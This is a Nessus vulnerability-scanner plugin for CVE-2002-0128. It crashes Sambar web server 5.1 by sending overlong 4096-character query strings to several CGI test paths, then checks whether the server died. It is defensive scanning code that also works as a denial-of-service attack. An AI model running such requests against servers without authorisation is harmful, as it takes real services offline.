#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPL
#
# References:
# From: "Tamer Sahin" <ts@securityoffice.net>
# To: bugtraq@securityfocus.com
# Subject: Sambar Webserver v5.1 DoS Vulnerability
# Date: Wed, 16 Jan 2002 01:57:17 +0200
# Affiliation: http://www.securityoffice.net
#
# Vulnerables:
# Sambar WebServer v5.1 
# NB: this version of Sambar is also vulnerable to a too long HTTP field.
#

if(description)
{
 script_version ("$Revision: 1.13 $");
 script_id(11131);
 script_bugtraq_id(3885);
 script_name(english:"Sambar web server DOS");
 script_cve_id("CVE-2002-0128");
 
 desc["english"] = "
It is possible to kill the Sambar web server 'server.exe'
by sending it a long request like:
	/cgi-win/testcgi.exe?XXXX...X
	/cgi-win/cgitest.exe?XXXX...X
	/cgi-win/Pbcgi.exe?XXXXX...X
(or maybe in /cgi-bin/)

A cracker may use this flaw to make your server crash 
continuously, preventing you from working properly.

Solution : upgrade your server to Sambar 51p or delete those CGI.

Risk factor : Medium";

 script_description(english:desc["english"]);
 
 summary["english"] = "Crashes Sambar web server";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright("This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 family["francais"] = "Déni de service";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencies("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_require_keys("www/sambar");
 exit(0);
}

# The script code starts here

include("http_func.inc");
include("http_keepalive.inc");

# The advisories are not clear: is this cgitest.exe or testcgi.exe?
# Is it in cgi-bin or cgi-win?
dir[0] = "";		# Keep it here or change code below
dir[1] = "/cgi-bin/";
dir[2] = "/cgi-win/";

fil[0] = "cgitest.exe";
fil[1] = "testcgi.exe";
fil[2] = "Pbcgi.exe";

port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

banner = get_http_banner(port: port);
if (! banner) exit(0);


if(http_is_dead(port:port))exit(0);

# TBD: request each URL a few times...
function test_port(port, cgi)
{
 soc = http_open_socket(port);
 if(!soc) return(1);
 
 r = string(cgi, "?", crap(4096));
 req = http_get(item:r, port:port);
 send(socket:soc, data:req);
 r = http_recv(socket:soc);
 http_close_socket(soc);
 return(0);
}

for (c=0; c<3; c=c+1) {
 # WARNING! Next loop start at 1, not 0 !
 for (d=1; d<3; d=d+1) {
  if (test_port(port: port, cgi: string(dir[d], fil[c]))) {
   # If we fail on the first connection, this means the 
   # server is already dead
   if ((c > 0) || (d > 1)) security_hole(port);
   exit(0);
  }
 }
}

if(http_is_dead(port:port))security_hole(port);
